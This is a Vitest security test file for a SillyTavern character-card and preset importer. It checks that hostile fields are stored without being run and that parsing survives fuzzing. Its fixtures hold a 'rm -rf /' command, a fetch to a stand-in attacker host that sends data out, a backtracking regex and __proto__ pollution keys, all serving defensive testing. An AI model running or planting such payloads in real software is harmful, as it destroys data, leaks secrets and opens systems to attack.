import { describe, expect, it, vi } from 'vitest'
import { importCharacterCard, importPreset } from '../src/index.ts'

const options = { sourceId: 'security-fixture', importedAt: 1 }

describe('@dsh-rp/compat-sillytavern adversarial imports', () => {
  it('retains shell, secret, endpoint, regex, and TavernHelper fields without invoking them', () => {
    const fetchMock = vi.fn(() => Promise.reject(new Error('network must remain unreachable')))
    vi.stubGlobal('fetch', fetchMock)
    const source = JSON.stringify({
      spec: 'chara_card_v3',
      spec_version: '3.0',
      data: {
        name: 'Hostile', description: '', personality: '', scenario: '', first_mes: 'Hello', mes_example: '',
        alternate_greetings: [], tags: [],
        extensions: {
          shell: 'rm -rf /', secret: '${API_KEY}', endpoint: 'https://attacker.invalid/collect',
          regex_scripts: [{ findRegex: '(a+)+$', replaceString: 'x' }],
          tavern_helper: { scripts: [{ content: 'fetch("https://attacker.invalid")' }] },
        },
      },
    })
    const result = importCharacterCard(source, options)
    expect(fetchMock).not.toHaveBeenCalled()
    expect(result.character.compatibility?.unknownFields).toMatchObject({
      data: { extensions: { shell: 'rm -rf /', secret: '${API_KEY}', endpoint: 'https://attacker.invalid/collect' } },
    })
    expect(result.character.compatibility?.lossReport?.items.map(item => item.feature)).toEqual([
      'display-regex', 'tavern-helper',
    ])
    vi.unstubAllGlobals()
  })

  it('does not allow preserved prototype-shaped keys to pollute host objects', () => {
    const source = '{"name":"Prototype","description":"","personality":"","scenario":"","first_mes":"Hi","mes_example":"","alternate_greetings":[],"tags":[],"extensions":{"__proto__":{"polluted":true},"constructor":{"prototype":{"polluted":true}}}}'
    const result = importCharacterCard(source, options)
    expect(({} as { polluted?: boolean }).polluted).toBeUndefined()
    expect(result.character.compatibility?.unknownFields).toMatchObject({
      extensions: { constructor: { prototype: { polluted: true } } },
    })
  })

  it('rejects negative zero because JSON normalization would otherwise change its value', () => {
    expect(() => importPreset(JSON.stringify({
      prompts: [{ identifier: 'main', content: 'x' }],
      prompt_order: [{ order: [{ identifier: 'main', enabled: true }] }],
      temperature: -0,
    }).replace('"temperature":0', '"temperature":-0'), options)).toThrow(/finite JSON object/u)
  })

  it('contains deterministic parser mutations without non-Error failures', () => {
    const valid = JSON.stringify({
      spec: 'chara_card_v3', spec_version: '3.0', data: {
        name: 'Fuzz', description: 'desc', personality: 'calm', scenario: 'room', first_mes: 'Hello', mes_example: '',
        alternate_greetings: ['Hi'], tags: ['fuzz'], extensions: { custom: true },
      },
    })
    let state = 0x9E3779B9
    let rejected = 0
    for (let index = 0; index < 256; index += 1) {
      state = xorshift(state)
      const offset = state % valid.length
      state = xorshift(state)
      const mutation = String.fromCharCode(1 + (state % 126))
      const candidate = index % 3 === 0
        ? valid.slice(0, offset)
        : index % 3 === 1
          ? `${valid.slice(0, offset)}${mutation}${valid.slice(offset + 1)}`
          : `${valid.slice(0, offset)}${mutation}${valid.slice(offset)}`
      try {
        importCharacterCard(candidate, { sourceId: `fuzz-${index}`, importedAt: index })
      } catch (error: unknown) {
        rejected += 1
        expect(error).toBeInstanceOf(Error)
      }
    }
    expect(rejected).toBeGreaterThan(150)
  })
})

function xorshift(value: number): number {
  let next = value >>> 0
  next ^= next << 13
  next ^= next >>> 17
  next ^= next << 5
  return next >>> 0
}
